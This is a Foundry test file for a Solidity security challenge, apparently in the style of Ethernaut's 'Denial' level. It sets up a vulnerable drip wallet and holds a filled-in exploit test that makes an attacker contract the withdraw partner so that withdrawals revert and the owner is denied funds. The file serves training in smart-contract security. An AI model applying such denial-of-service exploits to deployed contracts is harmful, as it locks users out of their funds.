// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/security-1/Denial.sol";

contract DenialTest is Test {
    Denial public dripWallet;
    Attacker public attackerContract;

    // do not prank this address
    address owner = address(0xA9E);

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED CHANGE ANYTHING HERE
         */

        // Deploy contract
        dripWallet = new Denial();
        // deposit 100 ether into wallet
        vm.deal(address(dripWallet), 100 ether);

        // show that owner can withdraw his share
        dripWallet.withdraw();
        assertEq(owner.balance, 1 ether);
    }

    function testExploit() public {
        /**
         * YOUR EXPLOIT CODE HERE
         */

        // Deploy attacker contract
        attackerContract = new Attacker(dripWallet);

        // verify that the attacker contract is the withdraw partner
        assertEq(address(attackerContract), dripWallet.partner());

        // call function withdraw to activate the exploit
        (bool success,) = address(dripWallet).call{gas: 1000000}(abi.encodeWithSignature("withdraw()"));
        require(!success, "Withdraw did not revert as expected");

        _checkSolved();
    }

    function _checkSolved() internal {
        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */
        assertGt(address(dripWallet).balance, 0);

        // should revert on withdraw
        vm.expectRevert();
        dripWallet.withdraw{gas: 1000000}();
    }

    receive() external payable {}
}
